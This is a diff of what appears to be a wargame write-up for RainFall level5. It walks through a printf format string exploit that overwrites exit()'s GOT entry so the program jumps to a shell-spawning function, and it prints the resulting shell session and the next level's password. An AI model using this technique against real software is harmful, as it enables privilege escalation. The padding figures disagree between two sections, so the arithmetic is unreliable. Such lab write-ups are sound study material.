@@ -1,3 +1,15 @@
+The program reads up to 512 characters from the user into buffer
+
+It then directly passes buffer to printf without format specifiers this introduces a format string vulnerability.
+
+This allows us to write arbitrary memory using format specifiers like %h, %n.
+
+We gone overwrite the GOT (Global Offset Table) entry of exit() with the address of the o() function.
+
+This way, when exit() is called, it actually jumps to o(), which runs /bin/sh.
+
+the address of the o() function
+
 ```
     (gdb) info functions 
         All defined functions:
@@ -44,10 +56,15 @@
 the address of o() is => 0x080484a4
 
 
-```
-    for geting arguments: ./level5 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
-```
+for geting arguments:
 
+```
+    level5@RainFall:~$ ./level5 <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
+    AAAABBBB.200..b7fd1ac0..b7ff37d0..41414141..42424242..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e..2e78252e.
+```
+the argument is 4
+
+the address of exit:
 
 ```
     level5@RainFall:~$ objdump -R ./level5 | grep exit
@@ -55,9 +72,7 @@ the address of o() is => 0x080484a4
     08049838 R_386_JUMP_SLOT   exit
 ```
 
-address of exit() is => 0x08049838 => 
-litle indian1 => \x38\x98\x04\x08
-litle indian2 => \x3a\x98\x04\x08
+the address of exit() is => 0x08049838 => litle indian1 => \x38\x98\x04\x08 | litle indian2 => \x3a\x98\x04\x08
 
 ```
     the address of o() is => 0x080484a4
@@ -69,10 +84,14 @@ litle indian2 => \x3a\x98\x04\x08
     second_padding = 33956 - 2052 = 31904
 ```
 
-python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%2044d%4$hn" + "%31904d%4$hn")' > /tmp/hax
-(cat /tmp/hax; cat) | ./level5
-
-
+```
+    level5@RainFall:~$ python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%2044d%4$hn" + "%31904d%4$hn")' > /tmp/hax
+    level5@RainFall:~$ (cat /tmp/hax; cat) | ./level5
+    whoami
+    level6
+    cat /home/user/level6/.pass                        
+    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
 
 9a3ida:
 ```
@@ -84,12 +103,4 @@ python -c 'print("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%2044d%4$hn" + "%319
     uper - dakchiliprintiti9bl = 2052 - 8 = 2044
 
     lower - upper = 40964 - 2052 = 38912
-```
-
-
-```
-    whoami
-    level6
-    cat /home/user/level6/.pass                        
-    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
